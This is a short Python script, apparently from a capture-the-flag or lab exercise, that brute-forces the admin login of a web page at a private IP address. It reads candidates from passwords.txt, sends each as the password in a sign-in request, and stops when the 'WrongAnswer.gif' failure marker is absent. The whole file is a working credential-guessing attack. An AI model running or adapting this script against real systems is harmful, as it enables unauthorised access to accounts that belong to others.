import requests
passwords = open('passwords.txt', 'r')
lines = passwords.readlines()

for line in lines:
    res = requests.get('http://10.13.100.182',
    params={'page': 'signin', 'Login': 'Login', 'username': 'admin', 'password': line.strip()}
    )
    if("WrongAnswer.gif" in res.text):
        print("❌   "+line.strip())
    else:
        print("✅   "+line.strip())
        break